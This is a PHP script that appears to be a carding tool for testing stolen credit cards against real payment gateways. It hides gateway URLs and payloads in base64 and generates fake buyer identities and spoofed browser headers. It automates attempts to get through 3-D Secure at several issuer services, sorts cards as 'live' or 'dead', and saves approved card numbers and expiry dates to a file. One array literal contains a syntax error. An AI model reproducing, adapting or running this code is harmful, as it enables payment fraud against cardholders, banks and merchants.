<?php
error_reporting(E_ERROR | E_PARSE);
!is_dir('C:\xampp\c') ? shell_exec('mkdir C:\xampp\c') : NULL;
$cookie = random(10);

$_SESSION['bG'] = [
  'useragent' => 'Mozilla/5.0 (Windows NT 6.1; '.random(6).') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.'.mt_rand(100,9999).'.154 Safari/'.mt_rand(100,999).'.36 OPR/20.0.'.mt_rand(100,999).'.91',
];
extract(($i_ = [
  'n' => random(5),
  'l' => random(5),
  'e' => random(8).'@gmail.com',
  'st' => random(8).' '.mt_rand(),
  'ct' => random(5),
  'phn' => '202'.mt_rand(1000000,9999999)
]));

extract($_GET);
if(($I = json_decode($data))->session) {
  
  extract(set_card($card, 4)); 
  $type = $cc[0] == 4 ? base64_decode("dmlzYQ==") : ($cc[0] == '5' ? base64_decode("bWFzdGVyY2FyZA==") : d('error', '[Card Type]'));
  $tries = 0;
  $C = json_decode(
    rq(base64_decode("aHR0cHM6Ly9ub2RlY2RlMS5wYXluYW1pY3MubmV0L3Bvc3NpYmxlL3RyYW5zYWN0aW9uL2NjL2ZldGNoL3VpL2NvbmZpZy9kYXRhMT0=").$I->data1.'&data2='.$t)
  );
  
  $x  = random(10).'.txt';
  fwrite(fopen($x, 'a'), "var RS = require('./rsa.js')
  var RSAEncrypt = new RS.JSEncrypt();
  var pub = '".str_replace("\n", '', trim($C->pub))."'
  RSAEncrypt.setPublicKey(pub);
  var encryptCardNo = RSAEncrypt.encrypt(JSON.stringify(a));
  console.log(encryptCardNo)");
  $e_cc = trim(shell_exec('node '.$x)); 
  unlink($x);

  $trnx = json_decode(rq(base64_decode('aHR0cHM6Ly9ub2RlY2RlMS5wYXluYW1pY3MubmV0L3Bvc3NpYmxlL3RyYW5zYWN0aW9uL3dmL2NjL3RyYW5zYWN0X2N2dl9vZmYvdG9rZW4/ZGF0YTE9').$I->data1.'&data2='.$t, [
    'postfields' => '{"agreement":true,"session":"'.$I->session.'","moment":"'.$I->moment.'","encData":"'.$e_cc.'"}',
    'httpheader' => [
      'accept: application/json',
      'content-type: application/json',
      'x-request-id: '.$C->trxData->request_id
    ]
  ]), 1);
  
  if($trnx['vpc_CardNum'] && $trnx['vpc_Amount']) {
    unset($trnx['action']); unset($trnx['processor']);
    extract($trnx);
  } else {
    d('error', '[transaction] Session Expired');
  }
  $mgs = rq(base64_decode('aHR0cHM6Ly9taWdzLm1hc3RlcmNhcmQuY29tLmF1L3ZwY3BheQ=='), [
    'header' => 1,
    'followlocation' => 1,
    'postfields' => base64_decode("dnBjX0FjY2Vzc0NvZGU9JHZwY19BY2Nlc3NDb2RlJnZwY19BbW91bnQ9JHZwY19BbW91bnQmdnBjX0NhcmRFeHA9JHZwY19DYXJkRXhwJnZwY19DYXJkTnVtPSR2cGNfQ2FyZE51bSZ2cGNfQ2FyZFNlY3VyaXR5Q29kZT0kdnBjX0NhcmRTZWN1cml0eUNvZGUmdnBjX0NvbW1hbmQ9cGF5JnZwY19HYXRld2F5PXNzbCZ2cGNfTWVyY2hUeG5SZWY9JHZwY19NZXJjaFR4blJlZiZ2cGNfTWVyY2hhbnQ9JHZwY19NZXJjaGFudCZ2cGNfT3JkZXJJbmZvPSR2cGNfT3JkZXJJbmZvJnZwY19SZXR1cm5VUkw9Ii51cmxlbmNvZGUoJHZwY19SZXR1cm5VUkwpLiImdnBjX1ZlcnNpb249MSZ2cGNfY2FyZD0kdnBjX2NhcmQmdnBjX1NlY3VyZUhhc2g9JHZwY19TZWN1cmVIYXNoJnZwY19TZWN1cmVIYXNoVHlwZT1TSEEyNTYmdnBjX0N1cnJlbmN5PVBIUA=="),
    'httpheader' => [
      'Connection: keep-alive',
      'Cache-Control: max-age=0',
      'Upgrade-Insecure-Requests: 1',
      'Content-Type: application/x-www-form-urlencoded',
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    ]
  ],1);
  $pId = g($mgs, 'paymentId=',"\r\n");
  if(g($mgs, '&vpc_Message=','&')) {
    g($mgs, '&vpc_Message=','&') == 'Approved' ? d('live', '[3dsPass] Approved') : d('dead', '[3dsN] '.g($mgs, 'vpc_Message=','&'));
  }
  $act = g($mgs, 'action="','"');
  $p = build(g($mgs, $act, '<table'), '<input');
  $ds = str_replace(["\t", ' ', "\n"], '', rq($act, 
  [
    'postfields' => http_build_query($p),
    'httpheader' => [
      'Content-Type: application/x-www-form-urlencoded',
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'Accept-Language: en-US,en;q=0.9'
    ]
  ],4)); 
  
  if(g($ds, 'name="PaRes"value="','"')) {
    $PP = build(g($ds, $pId,'</form>'), '<input');
    if((!substr_count ($ds, 'PaReq') ? (
      $ps = rq($p['TermUrl'], [
        'header' => 1,
        'followlocation' => 1,
        'postfields' => http_build_query($PP),
        'httpheader' => [
          'Content-Type: application/x-www-form-urlencoded'
        ]
      ],1)
    ) : NULL) === NULL) {
      $ps = rq($p['TermUrl'], [
        'header' => 1,
        'followlocation' => 1,
        'postfields' => http_build_query($PP),
        'httpheader' => [
          'Content-Type: application/x-www-form-urlencoded'
        ]
      ],1); 
    }
  } else {
    if(substr_count($act, 'www.securesuite.co.uk')) {
      $pares = secu($ds); 
    } else if(substr_count($act, 'authentication.cardinalcommerce.com')) {
      $pares = comm($ds);
    } elseif(substr_count($act, 'acsweb-pa.dnp-cdms.jp')) {
      $ID = g($ds, 'name="id"value="','"');
      $pares = g(rq('https://acsweb-pa.dnp-cdms.jp/auth/yub0/pa/V/attempt_receive_PC',
      [
        'postfields' => "id=".urlencode($ID),
        'httpheader' => [
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
          'Content-Type: application/x-www-form-urlencoded',
          'Host: acsweb-pa.dnp-cdms.jp',
          'Origin: https://acsweb-pa.dnp-cdms.jp'
        ]
      ],4), 'name="PaRes" value="','"');
    } else {
      d('dead', '3ds not supported');
    }
    $ps = rq($p['TermUrl'], [
      'header' => 1,
      'followlocation' => 1,
      'postfields' => http_build_query([
        'PaRes' => $pares,
        'MD' => $p['MD']
      ]),
      'httpheader' => [
        'Content-Type: application/x-www-form-urlencoded'
      ]
    ],1);
  }
  $R = g($ps, 'ocation: ',"\r\n");
  $e = explode('&', $R);
  foreach($e as $l) {
    $res[g($l, 'vpc_','=')] = g($l, '=','angpagkabinatamoaymapapalsipika');
  }
  if($res['Message'] == 'Approved') {
    fwrite(fopen('merci.txt', 'a'), $cc.'|'.$mm.'|'.$yyyy."\r\n");
    d('live', '['.preg_replace('/00/', '', $res['Amount'], 1).'] <a href="'.$R.'" target="_blank">Flex</a> CustomerName: ['.$C->trxData->payload->customer_info->fname.'] ['.$C->trxData->payload->customer_info->lname.']');
  } else {
    d('dead', '['.str_replace('+', ' ', $res['Message']).']');
  }
}
function comm($opt) {
  $trId = g($opt, 'name="TransactionId"type="hidden"value="','"');
  $sId = g($opt, 'name="IssuerId"type="hidden"value="','"');

  rq('https://authentication.cardinalcommerce.com/Api/NextStep/ProcessRisk',
    [
      'postfields' => base64_decode("VHJhbnNhY3Rpb25JZD0kdHJJZCZEZXZpY2VJZD0kdHJJZCZQcm92aWRlclR5cGU9VE0mUHJvdmlkZXJJZD0wMXp6dmM0MCZJc3N1ZXJJZD0kc0lkJlgtUmVxdWVzdGVkLVdpdGg9WE1MSHR0cFJlcXVlc3QmWC1IVFRQLU1ldGhvZC1PdmVycmlkZT1GT1JN"),
      'httpheader' => [
        'accept: */*',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://authentication.cardinalcommerce.com',
        'x-http-method-override: FORM',
        'x-requested-with: XMLHttpRequest'
      ]
    ], 4
  ); 

  $term = rq('https://authentication.cardinalcommerce.com/api/nextstep/term',
    [
      'postfields' => "TransactionId=$trId&IssuerId=".$sId,
      'httpheader' => [
        'accept: */*',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://authentication.cardinalcommerce.com',
        'x-requested-with: XMLHttpRequest'
      ]
    ]
  );
  return g($term, '"PARes":"','"');
}
function g($s, $t, $r) {
  return explode($r, explode($t, $s)[1])[0];
}
function secu ($opt) {
  $cyP = g($opt, 'name='."'".'cy_param_0'."'".'value="', '"');
  $I = rq('https://www.securesuite.co.uk/cba/tdsecure/intro.jsp',
    [
      'postfields' => "page_timeout_flag=false&c_flash=&a_data=pm_fpua%253Dmozilla%252F5.0%2520%28windows%2520nt%252010.0%253B%2520win64%253B%2520x64%29%2520applewebkit%252F537.36%2520%28khtml%252C%2520like%2520gecko%29%2520chrome%252F100.0.4896.79%2520safari%252F537.36%257C5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F100.0.4896.79%2520Safari%252F537.36%257CWin32%255E%7E%255Epm_fpsc%253D24%257C1920%257C1080%257C1040%255E%7E%255Epm_fpsw%253D%255E%7E%255Epm_fptz%253D8%255E%7E%255Elang%253Den-US%255E%7E%255Esyslang%253D%255E%7E%255Euserlang%253D%255E%7E%255Epm_fpjv%253Dfalse%255E%7E%255Epm_fpco%253Dtrue%255E%7E%255Epm_fpasw%253Dxyswrvqvqvkfchqiecbgw48epnz58epn%257Cevxlly58ev379%257Csjechwyswlly5co%257Cohdhqieix48ephjx%255E%7E%255Epm_fpan%253DNetscape%255E%7E%255Epm_fpacn%253DMozilla%255E%7E%255Epm_fpol%253Dtrue%255E%7E%255Epm_fposp%253D%255E%7E%255Epm_fpup%253D%255E%7E%255Epm_fpsaw%253D1920%255E%7E%255Epm_fpspd%253D24%255E%7E%255Epm_fpsbd%253D%255E%7E%255Epm_fpsdx%253D%255E%7E%255Epm_fpsdy%253D%255E%7E%255Epm_fpslx%253D%255E%7E%255Epm_fpsly%253D%255E%7E%255Epm_fpsfse%253D%255E%7E%255Epm_fpsui%253D&NF=noflash&FV=noflash&ERROR2=noflash&html5_data=H.84046676.9190569434&user_action=dummy&cy_param_0=".$cyP,
      'httpheader' => [,
        'Content-Type: application/x-www-form-urlencoded',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language: en-US,en;q=0.9'
      ]
      ], 4
  );
  if(substr_count($I, 'mobile:****')) {
    d('dead', '[OTP] Payment');
  }
  return g($I, 'name="PaRes"	value="','"');
}
function rq($u, $p = [], $t = 0) {
  global $cookie;
  if(!$p) $p[l('customrequest')] = 'GET';
  else foreach($p as $n => $s) { $p[l($n)] = $s; unset($p[$n]);}
  $p[l('returntransfer')] = 1;
  foreach($_SESSION['bG'] as $E => $N) {
    $p[l($E)] = $N;
  }
  $c = 'C:\xampp\c/'.$t.'_'.$cookie.'.txt';
  $p[10031] = $c;
  $p[10082] = $c;
  curl_setopt_array(($c = curl_init($u)), $p);
  $e = curl_exec($c);
  return $e;
}
function l ($a) {
  return eval('return CURLOPT_'.strtoupper($a).';');
}
function random($l){
  $ch = implode('', range('a', 'z')).implode('', range('A', 'Z'));
  $chs = strlen($ch);
  $str = '';
  for($i=0; $i <= $l; $i++){
    $str .= $ch[mt_rand(0, $chs)];
  }
  return $str;
}
function build ($f, $e, $s = '"') {
  foreach(explode($e, $f) as $o) {
    $dd[g($o, "name=$s", $s)] = g($o, "value=$s",$s);
  }
  unset($dd['']);
  unset($dd['submit']);
  return $dd;
}
function rmf() {
  foreach(glob('C:\xampp\c/*.txt') as $int => $value) {
    if(is_file($value)) {
      unlink($value);
    }
  }
}
function Receipt($link) {
  !is_dir('receipt') ? shell_exec('mkdir receipt') : NULL;
  $T = $_SESSION['data']['receipt'] = getcwd().'/receipt/'.random(10).'_FLEX';
  file_put_contents($T, $link);
}
function d($d, $r) {
  rmf();
  echo json_encode([
    'cards' => '<div id="rslt" class="rslt '.$d.'">'.$_GET['card'].'<hr></div>',
    'result' => '<div id="rslt" class="rslt '.$d.'">'.$r.'<hr></div>'
  ]);
  exit;
}
